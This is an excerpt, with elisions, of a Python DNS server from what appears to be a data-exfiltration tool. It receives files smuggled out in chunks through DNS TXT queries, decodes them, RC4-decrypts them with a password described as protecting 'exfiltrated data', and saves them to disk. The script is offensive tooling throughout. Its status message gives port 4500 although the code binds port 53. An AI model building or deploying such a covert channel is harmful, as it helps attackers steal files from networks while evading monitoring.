...
if __name__ == '__main__':
    ...
    parser.add_argument(
        "-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
    args = parser.parse_args()

    # Setup a UDP server listening on port UDP 53
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))
    print(color("[*] DNS server listening on port 4500"))
        ...
        while True:
            ...
            if request.q.qtype == 16:
                ...
                if qname.upper().startswith("INIT."):
                    ...
                    print(color(
                        "[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName, nbChunks)))

                    reply = DNSRecord(
                        DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(
                        RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
                    ...
                    if chunkIndex == nbChunks:
                        ...
                        try:
                            ...
                            with open(outputFileName, 'wb+') as fileHandle:
                                if useBase32:
                                    fileHandle.write(rc4Decryptor.binaryDecrypt(
                                        bytearray(fromBase32(fileData))))
                                else:
                                    fileHandle.write(rc4Decryptor.binaryDecrypt(
                                        bytearray(fromBase64URL(fileData))))
                                fileHandle.close()
                                print(
                                    color("[+] Output file [{}] saved successfully".format(outputFileName)))
                        except IOError:
                            print(
                                color("[!] Could not write file [{}]".format(outputFileName)))
